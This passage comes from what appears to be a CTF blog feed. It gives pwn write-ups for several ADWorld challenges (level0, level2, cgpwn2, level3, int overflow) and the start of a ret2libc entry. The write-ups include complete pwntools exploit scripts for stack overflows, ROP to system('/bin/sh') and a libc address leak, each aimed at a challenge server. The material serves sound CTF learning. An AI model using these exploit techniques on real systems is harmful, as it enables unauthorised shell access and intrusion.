<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">           +-----------------+&lt;---high address</span><br><span class="line">           |    0x400596     |</span><br><span class="line">           +-----------------+</span><br><span class="line">           |    0x000001     |</span><br><span class="line">    ebp---&gt;+-----------------+</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">           |       buf       |</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">ebp-0x80--&gt;+-----------------+&lt;---low address</span><br></pre></td></tr></table></figure>
<p>Finally we write exploit:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./level0&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">49170</span>)</span><br><span class="line">callsystem_addr = <span class="number">0x400596</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">128</span> + p64(<span class="number">1</span>) + p64(callsystem_addr)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>Attachment: <a href="/filehost/apeaw/level2">level2</a><br>Description: Caiji asks the god how to get the flag, and the god tells him “use ‘return-oriented programming’ (ROP).”</p>
<p>Check:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file level2</span><br><span class="line">level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</span><br><span class="line">$ checksec level2</span><br><span class="line">[*] <span class="string">&#x27;/root/level2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">--------------------------------- <span class="function">main</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">vulnerable_function</span>();</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- <span class="function">vulnerable_function</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This time we dont have <code>callsystem</code>, so we have to build <code>system(&#39;/bin/sh&#39;)</code> by ourselves. Here are things we may need:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># overflow variable (offset)</span><br><span class="line">char buf; // [esp+0h] [ebp-88h]     # offset 0x88</span><br><span class="line"></span><br><span class="line"># string `/bin/sh`</span><br><span class="line">.data:0804A024     hint            db &#x27;/bin/sh&#x27;,0</span><br><span class="line"></span><br><span class="line"># system plt</span><br><span class="line">.plt:08048320 000                 jmp     ds:off_804A010</span><br><span class="line">.plt:08048320     _system         endp</span><br><span class="line"></span><br><span class="line"># instruction `call system`</span><br><span class="line">0804845C 09C call    _system</span><br><span class="line">and</span><br><span class="line">0804849E 01C call    _system</span><br></pre></td></tr></table></figure>
<p>Our payload could be:</p>
<ol>
<li>payload &#x3D; ‘a’ * 0x88 + ‘aaaa’ + p32(0x0804845C) + p32(0x0804A024)<br> p32(call_system_addr)+p32(bin_sh_str_addr)</li>
<li>payload &#x3D; ‘a’ * 0x88 + ‘aaaa’ + p32(0x08048320) + p32(0) + p32(0x0804A024)<br> p32(system_plt_addr)+p32(0)+p32(bin_sh_str_addr)</li>
</ol>
<p>Exploit:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">37221</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x0804A024</span></span><br><span class="line"><span class="comment"># system_addr = 0x0804845C  # call system</span></span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27; * 136 + &#x27;aaaa&#x27; + p32(system_addr) + p32(bin_sh_addr)</span></span><br><span class="line">system_addr = <span class="number">0x08048320</span>    <span class="comment"># plt item</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">136</span> + <span class="string">&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>Attachment: <a href="/filehost/apeaw/cgpwn2">cgpwn2</a><br>Description: Caiji thinks he needs a string</p>
<p>Check:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file cgpwn2</span><br><span class="line">cgpwn2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=86982eca8585ab1b30762b8479a6071dbf584559, not stripped</span><br><span class="line">$ checksec cgpwn2</span><br><span class="line">[*] <span class="string">&#x27;/root/cgpwn2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">--------------------------------- <span class="function">main</span></span><br><span class="line"><span class="function">call <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">--------------------------------- hello</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+12h] [ebp-26h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;</span><br><span class="line">  v1 = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;s &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = <span class="number">0</span>;</span><br><span class="line">    v0 = (<span class="keyword">char</span> *)&amp;v6;</span><br><span class="line">    v1 = <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; (v1 &amp; <span class="number">0xFFFFFFFC</span>) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = <span class="number">0</span>;</span><br><span class="line">    v3 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">1</span> )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name&quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(name, <span class="number">50</span>, stdin);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello,you can leave some message here:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">gets</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can input to <code>name</code> and <code>s</code>, since <code>gets</code> is vulnerable, we might perform stack overflow on  <code>gets(&amp;s)</code>. </p>
<p>Here are things we may need:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># overflow variable (offset)</span><br><span class="line">char s; // [esp+12h] [ebp-26h]      # offset 0x26</span><br><span class="line"></span><br><span class="line"># global variable: name </span><br><span class="line">.bss:0804A080     name            db 34h dup(?)           ; DATA XREF: hello+77↑o</span><br><span class="line"></span><br><span class="line"># system plt</span><br><span class="line">.plt:08048420 000                 jmp     ds:off_804A01C</span><br><span class="line">.plt:08048420     _system         endp</span><br></pre></td></tr></table></figure>
<p>It does not have <code>callsystem</code> like level 0 does, but is similar to level 2, while it still lacks a <code>/bin/sh</code> string for <code>system</code> to use.</p>
<p>Since we input values to <code>name</code> and we know its address, we can make it the string <code>/bin/sh</code>, and this is how the exploit works:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./cgpwn2&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">32943</span>)</span><br><span class="line"><span class="comment"># ELF module debuts</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./cgpwn2&quot;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>] <span class="comment"># is plt address: 0x08048420</span></span><br><span class="line">name_addr = <span class="number">0x0804A080</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x26</span> + <span class="string">&#x27;aaaa&#x27;</span> + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32 (name_addr)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>Attachment: <a href="/filehost/apeaw/level3.gz">level3.gz</a><br>Description: libc!libc! This time there is no <code>system</code>, can you help Caiji solve this problem?</p>
<p>You have to extract it first. </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ tar -xzvf level3.gz</span><br><span class="line">./level3</span><br><span class="line">./libc_32.so.6</span><br></pre></td></tr></table></figure>
<p>Then check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file level3 libc_32.so.6</span><br><span class="line">level3:       ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44a438e03b4d2c1abead90f748a4b5500b7a04c7, not stripped</span><br><span class="line">libc_32.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=9a6b57c7a4f93d7e54e61bccb7df996c8bc58141, for GNU/Linux 2.6.32, stripped</span><br><span class="line">$ checksec level3</span><br><span class="line">[*] &#x27;/root/level3/level3&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">$ ./libc_32.so.6</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
<p>Pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">--------------------------------- <span class="function">main</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">vulnerable_function</span>();</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- <span class="function">vulnerable_function</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Look what else we may need:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># write plt</span><br><span class="line">.plt:08048340                 jmp     ds:off_804A018</span><br><span class="line">.plt:08048340 _write          endp</span><br></pre></td></tr></table></figure>
<p>As description says, we have no <code>system</code>, but we get target <code>libc</code> – file <code>libc_32.so.6</code>.<br>Though <code>ASLR</code> randomizes base addresses, the functions’ offset relative to the base address of the <code>libc</code> is constant. So we use <code>write</code> to get current <code>write</code> function address, and calculate <code>system</code> current address depending on this.</p>
<p>Real <code>system</code> address is in <code>GOT</code> (global offset table), but when calling <code>system</code> we call <code>PLT</code> (procedure linkage table). About <code>PLT</code> and <code>GOT</code> u can check <a class="link"   href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" >This Link<i class="fas fa-external-link-alt"></i></a> for details.</p>
<ul>
<li>The normal function call goes following the order of black, red and blue.<br><img src="/imghost/apeaw/PLT_GOT.png" alt="PLT_GOT"></li>
<li>To be more specific, the first call runs <code>dl_runtime_resolve</code> first to prepare:<br>![First Call](&#x2F;imghost&#x2F;apeaw&#x2F;1st call.jpg)</li>
<li>And subsequent calls are easier:<br>![Second Call](&#x2F;imghost&#x2F;apeaw&#x2F;2nd call.jpg)</li>
</ul>
<p>Exploit:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">33218</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p32(<span class="number">0</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">2</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0x4</span>)</span><br><span class="line"><span class="comment"># ssize_t write(int fd,const void*buf,size_t count);</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">write_got = u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line">libc_addr = write_got - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>() <span class="comment"># get `/bin/sh` addr</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; using LibcSearcher</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;write&#x27;, write_got)</span></span><br><span class="line"><span class="string">libc_base = write_got - libc.dump(&#x27;write&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.dump(&quot;system&quot;)</span></span><br><span class="line"><span class="string">#libc_binsh = libc.search(&quot;/bin/sh&quot;).next()</span></span><br><span class="line"><span class="string">bin_sh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p32(<span class="number">0</span>) + p32(system_addr) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int overflow"></a>int overflow</h2><p>Attachment: <a href="/filehost/apeaw/int_overflow">int_overflow</a><br>Description: Caiji thinks that there is no way to overflow this question, really?</p>
<p>Check:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file int</span><br><span class="line">int: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=aaef797b1ad6698f0c629966a879b42e92de3787, not stripped</span><br><span class="line">$ checksec int</span><br><span class="line">[*] <span class="string">&#x27;/root/int&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">--------------------------------- main </span><br><span class="line">need to input `<span class="number">1</span>` <span class="function">to go into <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function">--------------------------------- login</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-228h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+200h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your username:&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your passwd:&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x199</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">check_passwd</span>(&amp;buf);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- <span class="function">check_passwd</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)<span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------------------------- what_is_this     -- <span class="function"><span class="keyword">not</span> in the main logic</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">what_is_this</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Main idea is using <code>result = strcpy(&amp;dest, s);</code> in <code>check_passwd()</code> to perform stack overflow and return to <code>what_is_this()</code>.<br><code>s</code> in <code>check_passwd()</code> comes from <code>buf</code> in <code>login()</code>, so we should input <code>buf</code> in <code>login()</code> to overwrite <code>dest</code> in <code>check_passwd()</code>.<br>But before it, if we want to reach <code>result = strcpy(&amp;dest, s);</code>, make <code>v3 &lt;= 3u || v3 &gt; 8u</code> false first.</p>
<p>Here we use <a href="/2020/07/16/2020-07-16-Integer-Overflow-Intro/">integer overflow</a> to pass it.<br><code>v3</code> is an unsigned int (8 bits, 4 bytes), so the <code>0x100000001</code> is equal to <code>0x1</code> because the highest digit overflowed. BTW, if it is a signed int (7 bits + 1), <code>0x10000001</code> is definitely different from <code>0x1</code> (different sign).</p>
<p>Therefore our payload length should be between <code>259</code> and <code>264</code>.</p>
<p>Exploit:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./int&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">33616</span>)</span><br><span class="line">what_is_this_addr = <span class="number">0x0804868B</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="number">0x14</span> * <span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(what_is_this_addr) + <span class="string">&#x27;c&#x27;</span> * <span class="number">234</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>format-string</tag>
        <tag>stack-overflow</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Challenge Area Write-ups (ret2libc)</title>
    <url>/2020/08/07/2020-08-07-ADWorld-PWN-Challenge-Area-Write-ups-ret2libc/</url>
    <content><![CDATA[<p>This part is for <code>ret2libc</code> tasks, building <code>ROP</code> chain is a necessary skill.</p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>Attachment: <a href="/filehost/apcaw/pwn1.zip">pwn1.zip</a><br>Description: None</p>
<p>About <code>Canary</code> leaking and <code>ret2libc</code>.</p>
<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Unzip and check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ unzip pwn1.zip</span><br><span class="line">Archive:  pwn1.zip</span><br><span class="line">  inflating: babystack</span><br><span class="line">  inflating: libc-2.23.so</span><br><span class="line">$ file babystack</span><br><span class="line">babystack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d1d54a6fc21f6c1d9a92f4f3bfafadd44683afd4, stripped</span><br><span class="line">$ checksec babystack</span><br><span class="line">[*] &#x27;/mnt/c/Users/David/Desktop/babystack&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_4008B9</span>();</span><br><span class="line">    v3 = <span class="built_in">sub_400841</span>();</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x100</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">put</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_400AE7);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
